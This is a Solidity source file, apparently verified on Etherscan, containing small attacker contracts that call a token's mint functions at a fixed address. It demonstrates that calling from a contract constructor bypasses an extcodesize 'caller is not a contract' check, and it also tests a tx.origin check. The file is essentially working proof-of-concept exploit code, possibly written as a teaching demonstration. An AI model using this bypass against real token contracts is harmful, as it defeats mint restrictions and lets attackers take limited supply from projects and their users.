/**
 *Submitted for verification at Etherscan.io on 2022-02-20
*/

pragma solidity ^0.8.0;

interface IToken {
    function mintWithExtodesize(uint256 amount) external;
    function mintWithTx(uint256 amount) external;
}

// This contract is for attacking extcodesize
contract Attacker {
    constructor(){
        IToken(0x7F5a2CF1Fa37F974Df23d61a42B417aBfB7D9dd7).mintWithExtodesize(1);
    }
}

// This contract is for attacking tx.origin == msg.sender
contract Attacker2 {
    constructor(){
        IToken(0x7F5a2CF1Fa37F974Df23d61a42B417aBfB7D9dd7).mintWithTx(1);
    }
}


contract Main {

    constructor(){}

    Attacker attack;
    Attacker2 attack2;

    // This will fail the extcodesize check
    function attackToExt() public {
        IToken(0x7F5a2CF1Fa37F974Df23d61a42B417aBfB7D9dd7).mintWithExtodesize(1);
    }

    // Attacking with constructor will bypass the extcodesize check
    function attackWithConstructorToExt() public {
        attack = new Attacker();
    }

    // This attack to tx.origin == msg.sender will fail
    function attackToTx() public {
        IToken(0x7F5a2CF1Fa37F974Df23d61a42B417aBfB7D9dd7).mintWithTx(1);
    }

    // This attack to tx.origin == msg.sender will fail
    function attackWithConstructorToTx() public {
        attack2 = new Attacker2();
    }
}